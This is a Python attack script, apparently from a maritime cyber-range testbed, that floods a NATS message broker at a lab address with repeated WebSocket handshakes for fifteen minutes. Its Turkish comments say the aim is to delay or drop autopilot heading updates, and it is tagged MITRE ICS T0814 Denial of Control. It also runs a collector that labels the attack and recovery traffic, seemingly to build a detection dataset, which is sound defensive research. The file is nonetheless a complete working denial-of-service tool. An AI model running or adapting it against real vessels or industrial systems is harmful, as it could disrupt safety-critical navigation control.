#!/usr/bin/env python3
"""
T0814 - Denial of Control: NATS WebSocket Flood
NATS broker'a (192.168.249.2:80) yüksek frekanslı WS bağlantı flood.
Autopilot heading update'leri gecikir veya kaybolur.
MITRE: T0814 - Denial of Control
"""
import socket, threading, time, subprocess

DURATION = 900
RECOVERY = 120
NATS_HOST = "192.168.249.2"
NATS_PORT = 80
OUTPUT = "/root/MaCySTe/grad_rl_data/attack_data.csv"
COLLECTOR = "/root/MaCySTe/macyste_collector.py"
THREADS = 5


def run_collector(label, duration):
    cmd = ["python3", COLLECTOR, "--label", label,
           "--duration", str(duration), "--output", OUTPUT, "--append"]
    print(f"[COLLECTOR] label={label} duration={duration}s")
    return subprocess.Popen(cmd)


print(f"[T0814-NATS] NATS WS Flood basliyor ({THREADS} thread)...")
collector = run_collector("t0814_nats_flood", DURATION)

end_time = time.time() + DURATION
packet_count = 0
error_count = 0
stop_flag = threading.Event()

WS_HANDSHAKE = (
    b"GET / HTTP/1.1\r\n"
    b"Host: 192.168.249.2\r\n"
    b"Upgrade: websocket\r\n"
    b"Connection: Upgrade\r\n"
    b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
    b"Sec-WebSocket-Version: 13\r\n\r\n"
)

def worker():
    global packet_count, error_count
    while not stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((NATS_HOST, NATS_PORT))
            s.send(WS_HANDSHAKE)
            packet_count += 1
            s.close()
        except Exception:
            error_count += 1

threads = [threading.Thread(target=worker, daemon=True) for _ in range(THREADS)]
for t in threads:
    t.start()

while time.time() < end_time:
    remaining = int(end_time - time.time())
    if remaining % 60 == 0 and remaining > 0:
        print(f"[ATTACK] {packet_count} paket, {error_count} hata, kalan={remaining}s")
    time.sleep(1)

stop_flag.set()
for t in threads:
    t.join(timeout=2)

collector.wait()
print(f"[RECOVERY] {RECOVERY}s...")
run_collector("recovery", RECOVERY).wait()
print(f"[DONE] {packet_count} paket, {error_count} hata")
